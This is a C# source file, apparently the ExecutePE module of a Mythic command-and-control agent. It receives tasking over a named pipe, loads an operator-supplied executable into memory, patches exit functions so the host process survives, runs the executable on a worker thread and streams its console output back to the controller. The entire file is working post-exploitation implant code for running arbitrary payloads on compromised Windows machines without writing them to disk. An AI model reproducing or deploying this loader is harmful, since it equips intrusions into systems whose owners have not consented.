﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Threading;
using PhantomInterop.Serializers;
using System.Collections.Concurrent;
using PhantomInterop.Interfaces;
using PhantomInterop.Classes;
using PhantomInterop.Classes.Core;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Classes.Events;
using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Constants;
using ST = System.Threading.Tasks;
using System.IO.Pipes;
using ExecutePE.Helpers;
using static ExecutePE.PERunner;

namespace ExecutePE
{
    internal static class Program
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static string? _namedPipeName;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AsyncNamedPipeServer? _server;
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object>? _sendAction;
        private static ST.Task? _clientConnectedTask;

        private static int Main(string[] args)
        {
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];
            _sendAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _senderEvent,
                        _cts.Token.WaitHandle
                    });
                    while (_senderQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                    }
                }

                while (_senderQueue.TryDequeue(out byte[] message))
                {
                    pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                }

                // Wait for all messages to be read by Phantom
                pipe.WaitForPipeDrain();
                pipe.Close();
            };
            _server = new AsyncNamedPipeServer(_namedPipeName, instances: 1, BUF_OUT: IPC.SEND_SIZE, BUF_IN: IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += OnAsyncMessageReceived;
            var return_code = 0;
            try
            {
                if (IntPtr.Size != 8)
                {
                    throw new InvalidOperationException("Application architecture is not 64 bits");
                }

                _receiverEvent.WaitOne();
                //_server.Stop();

                IMythicMessage taskMsg;

                if (!_recieverQueue.TryDequeue(out taskMsg))
                {
                    throw new InvalidOperationException("Could not get tasking from Mythic");
                }

                if (taskMsg.GetTypeCode() != MessageType.ExecutePEIPCMessage)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.ExecutePEIPCMessage}, got {taskMsg.GetTypeCode()}");
                }

                ExecutePEIPCMessage peMessage = (ExecutePEIPCMessage)taskMsg;

                using (StdHandleRedirector redir = new StdHandleRedirector(OnBufferWrite))
                {
                    //PERunner.RunPE(peMessage);
                    // Set up API hooking for console functions
                    using (ExitInterceptor interceptor = new ExitInterceptor())
                    {
                        // Apply the patches before loading and running the PE
                        if (interceptor.ApplyExitFunctionPatches())
                        {
                            using (PERunner.MemoryPE memoryPE = new PERunner.MemoryPE(peMessage.Executable, peMessage.CommandLine))
                            {
                                // Create a wait handle to signal when execution is complete
                                var executionCompletedEvent = new ManualResetEvent(false);

                                // Execute the PE in a separate thread to avoid blocking the main thread
                                //Console.WriteLine("\nExecuting PE file in a separate thread...");
                                //Stopwatch sw = Stopwatch.StartNew();

                                ThreadPool.QueueUserWorkItem(_ =>
                                {
                                    try
                                    {
                                        // You can either use Execute() or ExecuteInThread()
                                        Console.WriteLine("[*] Calling PE entry point...");
                                        int? return_code = memoryPE.ExecuteInThread(waitForExit: true);
                                        Console.WriteLine($"\n[*] PE function returned with exit code: {return_code}");
                                        //Thread.Sleep(5000);
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine($"\nError during PE execution: {ex.Message}");
                                    }
                                    finally
                                    {
                                        // Signal completion regardless of outcome
                                        executionCompletedEvent.Set();
                                    }
                                });

                                // Wait for either completion or cancellation
                               // Console.WriteLine("Waiting for PE execution to complete...");

                                // Create an array of wait handles to wait for
                                WaitHandle[] waitHandles = new WaitHandle[]
                                {
                                    executionCompletedEvent,         // PE execution completed
                                };

                                // Wait for any of the handles to be signaled
                                int signalIndex = WaitHandle.WaitAny(waitHandles);
                            }
                            interceptor.RemoveExitFunctionPatches();
                        }
                        else
                        {
                            Console.WriteLine("Failed to apply exit function patches");
                        }
                    }
                }

            }
            catch (Exception exc)
            {
                // Handle any exceptions and try to send the contents back to Mythic
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(exc.ToString()));
                _senderEvent.Set();
                //return_code = exc.HResult;
            }
            _cts.Cancel();

            // Wait for the pipe client comms to finish
            while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
            {
                task.Wait(1000);
            }
            return return_code;
        }
        private static void OnBufferWrite(object sender, StringDataEventArgs args)
        {
            if (args.Data != null)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(args.Data));
                _senderEvent.Set();
            }
        }
        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            pipe.Flush();
        }
        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }

        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
